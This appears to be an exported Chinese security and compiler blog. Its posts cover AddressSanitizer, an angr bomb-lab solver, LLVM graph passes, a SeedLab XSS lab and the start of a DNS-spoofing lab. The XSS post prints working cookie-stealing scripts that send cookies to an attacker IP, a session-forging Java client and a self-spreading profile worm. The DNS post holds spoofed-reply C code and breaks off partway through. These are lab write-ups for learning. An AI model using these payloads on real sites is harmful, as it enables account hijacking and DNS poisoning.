下面，我们首先看一下一个Struct结构，该结构记录GlobalVariable存储的首地址，数据的大小，Redzone的大小，Module的名字等信息，便于在Runtime-library中使用。该结构在AddressSanitizerModule和runtime-library中都有相应的定义： 然后我们可以看到对GlobalVariable进行插桩来实现RedZone的Poison和整个GlobalVariable的Poison操作。 具体的Poison RedZone和Poison GlobalVariable的实现在Runtime-library中： Stack VariableStack Variable保存在栈区，在栈中的数据我们需要控制好变量的声明周期(lifetime),当调用一个函数时，会开辟一个栈，栈中的数据会有相应的redzone和shadow memory，并将redzone的shadow memory Poison，当函数结束（正常返回，异常），栈被销毁，需要将数据和redzone清空，其相应的shadow memory也要UnPoison掉。 对于Stack Variable，AddressSanitizer算法中实现了AddressSanitizer类，该类是继承了llvm的FunctionPass，该Pass能够处理每一个函数，在处理每个函数的时候，处理每一个load，store等能够访问内存的指令，在这些指令执行前进行插桩，看其访问的内存是不是被poison。 下面我们主要看一下AddressSanitizer::runOnFunction(Module &amp;M)函数中主要的插桩过程。 在每次访问内存时，都会查看影子内存的值，看其是否是0，如果是0则表示都能访问具体的插桩在instrumentMop函数中， 其中具体的处理过程在instrumentAddress函数中： Heap VariableHeap Variable保存在堆区，其分配的函数是malloc函数，该部分的主要代码在runtime-library中，该库中主要是先将malloc的库函数hook住，然后自己定义malloc函数，定义分配策略。 具体的分配策略定义在compiler-rt/lib/asan/asan-allocator.cc文件中，感兴趣可以看一下。]]></content>
      <categories>
        <category>LLVM</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
        <tag>Sanitizer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用angr和Radare解决CMU的二进制炸弹]]></title>
    <url>%2F2017%2F06%2F20%2Fangr-bomb%2F</url>
    <content type="text"><![CDATA[前言最近在学习angr的使用，主要是如何利用angr来进行符号执行分析。发现了国外一篇比较实用的文章介绍如何使用angr和Radare(二进制分析框架)来分析CMU的二进制炸弹问题。故在此翻译一下这篇文章的工作。 angrangr是一个使用python语言编写的二进制分析框架，它主要是进行静态和动态的符号分析，现已成为CTF比赛的一大利器。angr最主要的一个工具就是符号执行，具体的符号执行可以参考MIT的一个课程(需要梯子才可以观看)。 Radare2radare2是从零开始重写radare，以便提供一组库和工具来处理二进制文件。 在这篇文章里是先用的Radare2对二进制炸弹进行分析，弄清二进制文件的逻辑关系，然后再用angr的符号执行工具解出答案。关于radare2工具的介绍可以参考Radare2 Book 所面临的问题要用angr和radare2所解决的问题是CMU的二进制炸弹，我们在此只分析phase2部分，如果对其他部分有兴趣的话可以参考我的另一篇博客对二进制炸弹做了全面的分析。phase2主要是要求输入6个正确的数字。 CrackRadare2分析 使用Radare2加载程序，并输入aaa开始分析二进制程序 首先利用Radare2中的工具afl来查找符合条件的函数。使用afl并且grep(使用符号~来代表)筛选关键字, 可以看到筛选结果中有phase2。 使用seek工具来定位到我们感兴趣的函数处，此处为sym.phase_2函数。并用pdf([p]rint [d]issembly of [f]unction)命令来展示该函数的内容。 如何要展示函数中的控制流程图可以在Radare2中使用VV（两个大写的V）指令。 为了进行符号执行，我们必须弄清楚程序的输入是什么，通过radare工具反汇编出来的代码可以看出，函数read_six_numbers很有可能就是处理输入的函数。 在radare2中使用ga指令进入read_six_numbers函数, 具体的函数代码如下所示： 可以看出该函数中以六个数字作为scanf函数的输入，所以我们就将此作为输入。 接下来我们需要分析符号执行所需要开始的代码处，符号执行不能走的路径以及要到达的目标代码处。从上图可以看出0x400f10和0x400f20处的代码都调用explode_bomb函数。 具体的explode_bomb函数如上图所示，我们可以看出该函数会调用exit函数，所以我们要避免走到explode_bomb函数中去。即避免走到0x400f10和0x400f20。要到达的目标函数我们可以设置到从phase2函数中返回。我们将调用完read_six_numbers函数后一条指令即0x400f0a作为程序分析的开始处。 angr分析具体的angr分析代码如下所示：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354## Binary found here: http://csapp.cs.cmu.edu/3e/bomb.tarimport angr, loggingfrom subprocess import Popen, PIPEfrom itertools import productimport structdef main(): proj = angr.Project('bomb', load_options=&#123;'auto_load_libs':False&#125;) logging.basicConfig() logging.getLogger('angr.surveyors.explorer').setLevel(logging.DEBUG) def nop(state): return bomb_explode = 0x40143a # Start analysis at the phase_2 function after the sscanf state = proj.factory.blank_state(addr=0x400f0a) # Sscanf is looking for '%d %d %d %d %d %d' which ends up dropping 6 ints onto the stack # We will create 6 symbolic values onto the stack to mimic this for i in xrange(6): state.stack_push(state.se.BVS('int&#123;&#125;'.format(i), 4*8)) # Attempt to find a path to the end of the phase_2 function while avoiding the bomb_explode path = proj.factory.path(state=state) ex = proj.surveyors.Explorer(start=path, find=(0x400f3c,), avoid=(bomb_explode, 0x400f10, 0x400f20,), enable_veritesting=True) ex.run() if ex.found: found = ex.found[0].state answer = [] for x in xrange(3): curr_int = found.se.any_int(found.stack_pop()) # We are popping off 8 bytes at a time # 0x0000000200000001 # This is just one way to extract the individual numbers from this popped value answer.append(str(curr_int &amp; 0xffffffff)) answer.append(str(curr_int&gt;&gt;32 &amp; 0xffffffff)) return ' '.join(answer)def test(): assert main() == '1 2 4 8 16 32'if __name__ == '__main__': print(main())]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>翻译</tag>
        <tag>exploit</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[llvm:Data Flow Graph]]></title>
    <url>%2F2017%2F05%2F20%2Fllvm-DFG%2F</url>
    <content type="text"><![CDATA[Data Flow Graph基本概念Data Flow Graph又叫数据流程图，表示在一个函数中的数据流动的方向。比如一个指令1定义了一个新变量%a,而另一个指令2用到了变量%a，此时就存在从指令1到指令2的边。llvm IR的表示形式是SSA，简单的来说SSA表示形式就是一个变量只能定义一次。 123x = y + 1;x = y + 2;y = 3; 上面的形式就不是SSA的表示形式，因为x被定义（赋值）了两次，可以通过修改使其变成SSA的表示形式： 123x1 = y + 1;x2 = y + 2;y = 3; 实验过程在具体的实验中，我们遍历函数中的每一个指令，判断该指令是否为load，store指令，把load和store指令与其他指令区别开来是因为在IR中只有store和load指令直接与内存直接接触。 123456789101112131415 case llvm::Instruction::Load:&#123; LoadInst* linst = dyn_cast&lt;LoadInst&gt;(curII); Value* loadValPtr = linst-&gt;getPointerOperand(); edges.push_back(edge(node(loadValPtr, getValueName(loadValPtr)), node(curII, getValueName(curII)))); break;&#125;case llvm::Instruction::Store: &#123; StoreInst* sinst = dyn_cast&lt;StoreInst&gt;(curII); Value* storeValPtr = sinst-&gt;getPointerOperand(); Value* storeVal = sinst-&gt;getValueOperand(); edges.push_back(edge(node(storeVal, getValueName(storeVal)), node(curII, getValueName(curII)))); edges.push_back(edge(node(curII, getValueName(curII)), node(storeValPtr, getValueName(storeValPtr)))); break;&#125; 对于其余的指令，遍历每一个指令的操作数，判断其是不是一个指令，如果是指令的话，就添加相应的边。 12345678for (Instruction::op_iterator op = curII-&gt;op_begin(), opEnd = curII-&gt;op_end(); op != opEnd; ++op) &#123; Instruction* tempIns; if (dyn_cast&lt;Instruction&gt;(*op)) &#123; edges.push_back(edge(node(op-&gt;get(), getValueName(op-&gt;get())), node(curII, getValueName(curII)))); &#125; &#125; 具体代码请参考我的github]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[llvm:Call Graph And Control Flow Graph]]></title>
    <url>%2F2017%2F05%2F20%2Fllvm-CGAndCFG%2F</url>
    <content type="text"><![CDATA[前言最近对llvm框架进行了初步的了解，才体会了llvm真正的魅力。它不仅是一个编译器框架，更是研究者们研究程序的一个有力的工具。本篇文章主要介绍一下如何对llvm的中间语言IR进行处理从而生成Call Graph(CG)和Control Flow Graph。 Call GraphCall Graph又叫做函数调用图，用来记录程序中的函数调用关系的。比如： 1234void foo()&#123; a(); b();&#125; 在上面的例子中，foo函数调用了a函数和b函数，则程序的函数调用图为 foo -&gt; a, foo -&gt; b. 我们在llvm的IR层面上进行分析(llvm允许我们自己编写Pass分析程序来对IR进行分析或修改）。具体的Pass教程可参考how to write a pass 在实现Call Graph过程中所需要了解的是在IR中间代码中，调用函数有两种表示形式，一种是使用call调用，另一种是使用invoke调用。这两种形式的区别是call调用的函数中没有异常需要捕捉，而invoke调用的函数中有异常需要捕捉。因此在invoke指令中除了所调用的函数这一标签外还有exception这一标签 12&lt;result&gt; = invoke [cconv] [ret attrs] &lt;ptr to function ty&gt; &lt;function ptr val&gt;(&lt;function args&gt;) [fn attrs] to label &lt;normal label&gt; unwind label &lt;exception label&gt; 上面除了normal标签（调用的函数）之外，还有exception标签（捕捉的异常） 所以我们对于CallInst和InvokeInst都要进行处理。 因此，我声明一个class继承自ModulePass，并且重载runOnModule(Module &amp;M)函数。我们首先找到c/c++语言的入口函数main,并遍历main函数的每一个指令，使用dyn_cast函数来判断指令是callInst还是invokeInst,当是这两个指令的时候，解析这两个指令，通过getCalledFunction()函数来获得所调用的函数，如果该函数还没有被遍历到，就将其加入到栈中，等到以后遍历到。具体的函数过程如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798bool CGPass::runOnModule(Module &amp;M) &#123; Function *main = M.getFunction("main"); G = new CallGraph(main); G-&gt;valueList.push_back(main); if (!main) return false; std::deque&lt;Function*&gt; list; list.push_back(main); while (!list.empty()) &#123; Function* func = list.front(); list.pop_front(); for (Function::iterator iter = func-&gt;begin(); iter != func-&gt;end(); ++iter) &#123; for (BasicBlock::iterator Biter = iter-&gt;begin(); Biter != iter-&gt;end(); ++Biter) &#123; Instruction *I = &amp;*Biter; if (CallInst *inst = dyn_cast&lt;CallInst&gt;(I)) &#123; //errs() &lt;&lt;"instruction\n"; Function* called = inst-&gt;getCalledFunction(); if (called) &#123; //errs() &lt;&lt;"instruction1\n"; //errs() &lt;&lt;"instruction2\n"; G-&gt;AddEdge(func, called); if (!G-&gt;hasFunction(called)) &#123; list.push_back(called); G-&gt;valueList.push_back(called); &#125; //&#125; &#125; &#125; if (InvokeInst *inst = dyn_cast&lt;InvokeInst&gt;(I)) &#123; Function* called = inst-&gt;getCalledFunction(); errs() &lt;&lt; "hello\n"; if (called) &#123; G-&gt;AddEdge(func, called); if (!G-&gt;hasFunction(called)) &#123; list.push_back(called); G-&gt;valueList.push_back(called); &#125; &#125; &#125; &#125; &#125; &#125; //G-&gt;print(); G-&gt;dump();&#125; 完整的代码请参考我的github 注：我在实际的实验过程中，发现c++的new函数在llvm中的表示为@_Znwm；并且由于C++的动态绑定特性，其所调用的虚函数只有在运行的时候才能确定，虚函数在c++中都保存在一个vtable中，并且在llvm中在调用虚函数的时候是直接取得该函数在vtable中的位置的指针，即该函数的指针。具体的操作可以参考如下示例：123%16 = getelementptr inbounds void (%class.A*)*, void (%class.A*)** %15, i64 0 %17 = load void (%class.A*)*, void (%class.A*)** %16, align 8 call void %17(%class.A* %13) 因为vtable是从一个实例类的0偏移开始存储的，所以在该实例中从(%class.A)指向的地址开始获取，由于是第一个虚函数，所以getelementptr的偏移为0，然后调用load函数获得该虚函数，随后调用该虚函数。可是遗憾的是我们根据CallInst指令获得该函数的时候函数为空，可能因为函数的动态绑定，只能在运行的时候才能确定具体的函数吧。 Control Flow GraphControl Flow Graph又叫做控制流程图，表示一个函数之间Basic Block的控制关系。Basic Block是一个函数中的基本块，在llvm中有BasicBlock表示基本块，并可以通过1for (Function::iterator B_iter = F.begin(); B_iter != F.end(); ++B_iter) 来遍历一个函数中的所有基本块。并且在llvm中有专门的函数successors(BasicBlock *B)来获得BasicBlock B的后继基本块。所以获得一个函数的Control Flow Graph的逻辑还是比较简单的。关键代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758bool runOnFunction(Function &amp;F) override &#123; raw_string_ostream rso(str); StringRef name(F.getName().str() + ".dot"); enum sys::fs::OpenFlags F_None; raw_fd_ostream file(name, error, F_None); //std::ofstream os; //os.open(name.str() + ".dot"); //if (!os.is_open())&#123; // errs() &lt;&lt; "Could not open the " &lt;&lt; name &lt;&lt; "file\n"; // return false; //&#125; file &lt;&lt; "digraph \"CFG for'" + F.getName() + "\' function\" &#123;\n"; for (Function::iterator B_iter = F.begin(); B_iter != F.end(); ++B_iter)&#123; BasicBlock* curBB = &amp;*B_iter; std::string name = curBB-&gt;getName().str(); int fromCountNum; int toCountNum; if (basicBlockMap.find(curBB) != basicBlockMap.end()) &#123; fromCountNum = basicBlockMap[curBB]; &#125; else &#123; fromCountNum = bbCount; basicBlockMap[curBB] = bbCount++; &#125; file &lt;&lt; "\tBB" &lt;&lt; fromCountNum &lt;&lt; " [shape=record, label=\"&#123;"; file &lt;&lt; "BB" &lt;&lt; fromCountNum &lt;&lt; ":\\l\\l"; for (BasicBlock::iterator I_iter = curBB-&gt;begin(); I_iter != curBB-&gt;end(); ++I_iter) &#123; //printInstruction(&amp;*I_iter, os); file &lt;&lt; *I_iter &lt;&lt; "\\l\n"; &#125; file &lt;&lt; "&#125;\"];\n"; for (BasicBlock *SuccBB : successors(curBB))&#123; if (basicBlockMap.find(SuccBB) != basicBlockMap.end()) &#123; toCountNum = basicBlockMap[SuccBB]; &#125; else &#123; toCountNum = bbCount; basicBlockMap[SuccBB] = bbCount++; &#125; file &lt;&lt; "\tBB" &lt;&lt; fromCountNum&lt;&lt; "-&gt; BB" &lt;&lt; toCountNum &lt;&lt; ";\n"; &#125; &#125; file &lt;&lt; "&#125;\n"; file.close(); return false; &#125; //void printInstruction(Instruction *inst, std::ofstream os) &#123; //&#125; &#125;; 完整的代码请参考我的github]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SeedLab:Web XSS]]></title>
    <url>%2F2017%2F05%2F16%2Fxss%2F</url>
    <content type="text"><![CDATA[环境配置： 启动apache2服务：sudo service apache2 start 配置Apache服务，在/etc/apache2/sites-available/default中，配置如下： 实验内容：Task 1:显示Alert窗口在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：1&lt;script&gt;alert(‘XSS’);&lt;/script&gt; 如下图所示: 登陆用户名bin，然后查看boby的信息，结果如下，会弹出一个窗口，结果如下： 将恶意内容放入js文件中，然后把链接指向js文件，具体指令如下： attack.js文件的内容如下,将该文件放入xss.lagelgg.com的根目录下(/var/www/XSS/elgg/) bin用户访问boby用户的信息时，攻击成功： Task2:展示用户的cookie信息在boby用户信息的编写框中输入如下攻击信息: &lt;script&gt;alert(document.cookie);&lt;/script&gt; 然后bin用户查看boby用户的信息时，出现如下弹框: Task 3:在boby用户信息的编写框中输入如下攻击信息(其中192.168.47.181为攻击中机器的ip地址): &lt;script&gt;document.write(&apos;&lt;img src =http://192.168.47.181:5555?c=&apos;+escape(document.cookie) + &apos; &gt;&apos;);&lt;/script&gt; 然后在攻击者机器中运行echoserv文件，让它监听5555端口，当bin用户查看boby的用户信息的时候，bin用户的cookie信息被发送到攻击者的机器上： Task4:用偷来的Cookie来进行会话攻击首先在boby的用户信息编写框中输入如下信息: &lt;script&gt;document.write(&apos;&lt;img src=http://127.0.0.1:5555?c=&apos;+escape(document.cookie)+&apos;&amp;&apos;+elgg.security.token.__elgg_ts+&apos;&amp;&apos;+elgg.security.token.__elgg_token+&apos; &gt;&apos;);&lt;/script&gt; 该js脚本的作用就是将访问boby用户信息的用户的cookie和elgg_ts,elgg_token信息发送到攻击者机器。 用LiveHttpHeaders工具来查看加好友的包的情况： 根据抓的包的信息来完成程序的构造： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import java.net.*;import java.io.*;public class HTTPSimpleForge &#123; public static void main(String[] args) throws IOException &#123; try &#123; int responseCode; InputStream responseIn=null; // URL to be forged. URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=41&amp;__elgg_ts=1464013312&amp;__elgg_token=c2aa7157f41d7d265d4f082aa0b03b4f"); URLConnection urlConn = url.openConnection(); if (urlConn instanceof HttpURLConnection) &#123; urlConn.setConnectTimeout(60000); urlConn.setReadTimeout(90000); &#125; urlConn.addRequestProperty("Host","www.xsslabelgg.com"); urlConn.addRequestProperty("User-Agent","Sun JDK 1.6"); urlConn.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); urlConn.setRequestProperty("Accept-Language","en-us,en;q=0.5"); urlConn.setRequestProperty("Accept-Encoding","gzip,deflate"); urlConn.setRequestProperty("Referer","http://www.xsslabelgg.com/profile/charlie"); urlConn.setRequestProperty("Cookie","Elgg=rpmo7shdmq6b6kdg38o76oo3j5"); urlConn.setRequestProperty("Connection","keep-alive"); urlConn.setDoOutput(true); String data="username=charlie&amp;seed=charlie@seed.com"; OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream()); wr.write(data); wr.flush(); // HttpURLConnection a subclass of URLConnection is returned by // url.openConnection() since the url is an http request. if (urlConn instanceof HttpURLConnection) &#123; HttpURLConnection httpConn = (HttpURLConnection) urlConn; // Contacts the web server and gets the status code from // HTTP Response message. responseCode = httpConn.getResponseCode(); System.out.println("Response Code = " + responseCode); // HTTP status code HTTP_OK means the response was // received sucessfully. if (responseCode == HttpURLConnection.HTTP_OK) &#123; // Get the input stream from url connection object. responseIn = urlConn.getInputStream(); // Create an instance for BufferedReader // to read the response line by line. BufferedReader buf_inp = new BufferedReader( new InputStreamReader(responseIn)); String inputLine; while((inputLine = buf_inp.readLine())!=null) &#123; System.out.println(inputLine); &#125; &#125; &#125; &#125; catch (MalformedURLException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 更改攻击者机器的/etc/hosts文件,使其修改/etc/hosts文件：将www.xsslabelgg.com的ip地址改为192.168.47.185（受害者机器的ip） 在受害者机器上登入samy用户,首先查看samy的好友情况，可知现在samy没有好友: Samy查看boby的信息，其cookie信息，cookie和elgg_ts,elgg_token信息都发回了攻击者机器： 将编写的攻击程序的cookie，elgg_ts,elgg_token等信息填充好，编译程序Javac HTTPSimpleForge.java，然后运行java HTTPSimpleForge,收到html的返回信息： 可知结果为200，查看samy的好友信息如下： 可知攻击成功。 Task 5：写一个XSS蠕虫首先登陆boby用户，修改用户信息，查看包的情况如下： 根据包的情况编写worm.js程序： 123456789101112131415161718192021222324252627282930var nod = document.getElementsByClassName("elgg-border-plain elgg-transition");var user = nod[0].attributes.getNamedItem("alt").nodeValue;if(user != 'Boby')&#123;var Ajax=null;// Construct the header information for the HTTP requestAjax=new XMLHttpRequest();if(Ajax == null) alert("Ajax is null");Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);Ajax.setRequestHeader("Host","www.xsslabelgg.com");Ajax.setRequestHeader("User-Agent","AJAX 1.2");Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");Ajax.setRequestHeader("Accept-Encoding","gzip,deflate");var node = document.getElementsByClassName("elgg-border-plain elgg-transition");var username = node[0].attributes.getNamedItem("alt").nodeValue;Ajax.setRequestHeader("Refer","http://www.xsslabelgg.com/profile/"+username+"/edit");Ajax.setRequestHeader("Keep-Alive","300");Ajax.setRequestHeader("Connection","keep-alive");Ajax.setRequestHeader("Cookie",document.cookie);Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");// Construct the content. The format of the content can be learned// from LiveHTTPHeaders.var content = "__elgg_token="+elgg.security.token.__elgg_token+"&amp;__elgg_ts="+elgg.security.token.__elgg_ts+"&amp;name="+username+"&amp;description=I'm stupid&amp;guid="+elgg.session.user.guid;Ajax.setRequestHeader("Content-Length",content.length);// Send the HTTP POST request.Ajax.send(content);&#125; 现在在boby的profile中添加worm: 更改完毕： 现在以samy的身份登入，首先查看一下samy的信息，发现什么都没有描述： 然后其访问boby的个人信息： 再次查看自己的信息： 攻击成功。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>seed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SeedLab:Remote DNS Attack]]></title>
    <url>%2F2017%2F05%2F16%2Fremote-dns-attack%2F</url>
    <content type="text"><![CDATA[实验环境：服务器ip：192.168.86.139 Victim ip: 192.168.86.137 Attacker ip:192.168.86.138 准备工作： 安装bind9服务器： 在bind9官网 下载bind9,在此下载的是bind9.10.4 解压文件tar -xzvf bin9.10.4.tar.gz cd bin9.10.4,并./configure –prefix=/usr/local/bind-9.9.0 –enable-threads –disable-openssl-version-check –sysconfdir=/etc –with-libtool –without-openssl 由于没有安装openssl，所以在最后的选项中加入–without-openssl make &amp; make install ln –sv /usr/local/bind-9.9.0 /usr/local/bind 软连接 在服务器中开启 sudo rndc flush // 刷新cache sudo rndc dumpdb -cache // 将cache dump到dump.db 开启bind9服务：sudo service bind9 start 用户机器配置： vi /etc/resolv.conf，修改nameserve 192.168.86.138（DNS服务器地址） 在ubuntu中，/etc/resolv.conf可能被DHCP客户端更改，所以需要将DHCP关闭，具体做法如下：settings-&gt;network-&gt;options-&gt;IPV4 Settings，设置method为Automatically DHCP addresses only, 并在DNS servers处填写为DNS服务器地址 查看用户机是否将dns服务器配置成功：打开wireshark，并在该机器中ping www.google.com,在wireshark的筛选规则中填写dns，查看抓包情况： 实验步骤：实验一：Kaminsky攻击攻击准备： 确认攻击机器的连接方式是NAT 由于DNS的服务器端口可能不确定，在此将服DNS服务器的端口设置为33333，具体设置如下：vi /etc/bind/named.conf.options,添加query-source port 33333; 将DNS服务器的DNSSEC策略关闭，具体设置如下：vi /etc/bind/named.conf.options，找到dnssec-validation auto;，将其注释掉，并添加dnssec-enable no; 刷新dns cache，并从其dns服务： 12sudo rndc flushsudo service bind9 restart 实验原理：（1）攻击者向被攻击的本地缓存DNS发送一个域名的DNS 查询请求，该查询请求中的域名主机使用随机序列和目标域名的组合。例如www123456.test.com，其中ns2.test.com为目标域名，www123456是随机生成的。很显然，这个查询的域名主机记录在test.com的权威DNS中是不存在的。正常test.com的权威DNS要返回NXDOMIAN（代表域名不存在）。换句话说就是本地缓存DNS中肯定没有www123456.test.com的缓存记录，本地缓存DNS接收到这个域名查询请求后肯定是要出去迭代请求的。 （2）攻击者伪造test.com的权威DNS应答数据包中，应答资源记录部分与正确应答包中部分是与正常结果一样的，比如test.com的DNS的IP地址、UDP端口号、应答结果是NXDOMAIN。但是，在应答报文中的授权资源记录部分，攻击者伪造一个test.com的NS记录为ns2.test.com，且该记录对应的A记录IP是2.2.2.2（可能是一个钓鱼网站的IP）。那么该资源记录信息将也被写入本地缓存DNS的Cache 中，在Cache 保持时间内，对test.com名字服务器所管辖的所有域名的查询都将被发送到攻击者自己控制的IP（2.2.2.2）中。 具体攻击过程： 找到example.com域名服务器的ip地址在攻击者机器上ping www.example.com，用wireshark抓包有如下这个数据包，该数据包是从199.43.133.53的ip地址回复的example.com包的查询。所以需要伪造的ip地址为199.43.133.53。 构造回复包在此主要介绍构造DNS域的包的过程。 DNS包的结果如上图所示：在此介绍构造每一个域的过程。 DNS头有16个字节，分别是标识ID，标志，问题数，资源数，授权资源记录数，额外资源记录数，结果如下所示： 12345678 struct dnsheader &#123; unsigned short int query_id; unsigned short int flags; unsigned short int QDCOUNT; unsigned short int ANCOUNT; unsigned short int NSCOUNT; unsigned short int ARCOUNT;&#125;; 其中标志ID为DNS报文的ID，对于相关联的请求报文和应答报文，这个字段是相同的，由此可以区分DNS应答报文是哪个请求报文的响应。由于不知道dns请求199.43.133.53时的ID号，所以在此将id号从3000到3100，每个id号都构造一个包。’ 对于flags来说，根据wireshark抓包可知，大小为0x8400 随后的8个字节，由wireshark抓包可得，这四个域都为1。 随后就是将查询问题的内容给加进去，由于源程序给了构造查询问题的步骤，所以，现在直接将其构造的内容加进去即可。 Dns查询域名的结果的构造，如下图所示，该域主要是回答了www.example.com的ip地址和以及类型和类，该出类型为A,表示是由域名获得该域名的IP地址，类为IN，表示表示为Internet名字空间。所以在构造该域的时候可以将ip地址改了，我在该实验中将ip地址改为了1.2.3.4 接下来是要构造域名服务器，也是要构造的重点，由wireshark抓包得： 该域主要有Name，Type，Class，TTL，Data length和NS构成，其中Type为NS表示为Name Server，即域名服务器，TTL为该记录的有效时间, Name表示主域名。所以我在此构造将Name Server改为了ns.dnslabattacker.net。 接下来就是一些额外的信息，由wireshark抓包如下图所示： 写具体的程序进行攻击123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634 // ----udp.c------// This sample program must be run by root lol! // // The program is to spoofing tons of different queries to the victim.// Use wireshark to study the packets. However, it is not enough for // the lab, please finish the response packet and complete the task.//// Compile command:// gcc -lpcap udp.c -o udp//// #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/ip.h&gt; #include &lt;netinet/udp.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;stdlib.h&gt;#include &lt;libnet.h&gt; // The packet length #define PCKT_LEN 8192 #define FLAG_R 0x8400 #define FLAG_Q 0x0100 // Can create separate header file (.h) for all headers' structure // The IP header's structure struct ipheader &#123; unsigned char iph_ihl:4, iph_ver:4; unsigned char iph_tos; unsigned short int iph_len; unsigned short int iph_ident; // unsigned char iph_flag; unsigned short int iph_offset; unsigned char iph_ttl; unsigned char iph_protocol; unsigned short int iph_chksum; unsigned int iph_sourceip; unsigned int iph_destip; &#125;; // UDP header's structure struct udpheader &#123; unsigned short int udph_srcport; unsigned short int udph_destport; unsigned short int udph_len; unsigned short int udph_chksum; &#125;; struct dnsheader &#123; unsigned short int query_id; unsigned short int flags; unsigned short int QDCOUNT; unsigned short int ANCOUNT; unsigned short int NSCOUNT; unsigned short int ARCOUNT;&#125;;// This structure just for convinience in the DNS packet, because such 4 byte data often appears. struct dataEnd&#123; unsigned short int type; unsigned short int class;&#125;; // total udp header length: 8 bytes (=64 bits)// structure to hold the answer end sectionstruct ansEnd&#123; //char* name; unsigned short int type; //char* type; unsigned short int class; //char* class; //unsigned int ttl; unsigned short int ttl_l; unsigned short int ttl_h; unsigned short int datalen;&#125;;// structure to hold the authorative nameserver end sectionstruct nsEnd&#123; //char* name; unsigned short int type; unsigned short int class; //unsigned int ttl; unsigned short int ttl_l; unsigned short int ttl_h; unsigned short int datalen; //unsigned int ns;&#125;;unsigned int checksum(uint16_t *usBuff, int isize)&#123; unsigned int cksum=0; for(;isize&gt;1;isize-=2)&#123; cksum+=*usBuff++; &#125; if(isize==1)&#123; cksum+=*(uint16_t *)usBuff; &#125; return (cksum);&#125;// calculate udp checksumuint16_t check_udp_sum(uint8_t *buffer, int len)&#123; unsigned long sum=0; struct ipheader *tempI=(struct ipheader *)(buffer); struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader)); struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader)); tempH-&gt;udph_chksum=0; sum=checksum( (uint16_t *) &amp;(tempI-&gt;iph_sourceip) ,8 ); sum+=checksum((uint16_t *) tempH,len); sum+=ntohs(IPPROTO_UDP+len); sum=(sum&gt;&gt;16)+(sum &amp; 0x0000ffff); sum+=(sum&gt;&gt;16); return (uint16_t)(~sum); &#125; // Function for checksum calculation. From the RFC, // the checksum algorithm is: // "The checksum field is the 16 bit one's complement of the one's // complement sum of all 16 bit words in the header. For purposes of // computing the checksum, the value of the checksum field is zero." unsigned short csum(unsigned short *buf, int nwords) &#123; // unsigned long sum; for(sum=0; nwords&gt;0; nwords--) sum += *buf++; sum = (sum &gt;&gt; 16) + (sum &amp;0xffff); sum += (sum &gt;&gt; 16); return (unsigned short)(~sum); &#125;//构造的回复包int response(char* request_url, char* src_addr, char* dest_addr)&#123;// socket号 int sd;// 包的buffer char buffer[PCKT_LEN];// 将buffer初始化为0 memset(buffer, 0, PCKT_LEN); // 初始化包头地址 struct ipheader *ip = (struct ipheader *) buffer; struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader)); struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));// data内容的指针 char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));//dns的flag位///////////////////////////构造dns包//////////////////////////////////// dns-&gt;flags=htons(FLAG_R); dns-&gt;QDCOUNT=htons(1); dns-&gt;ANCOUNT=htons(1); dns-&gt;NSCOUNT=htons(1); dns-&gt;ARCOUNT = htons(1);//查询的内容 strcpy(data,request_url); int length= strlen(data)+1; struct dataEnd * end=(struct dataEnd *)(data+length); end-&gt;type=htons(1); 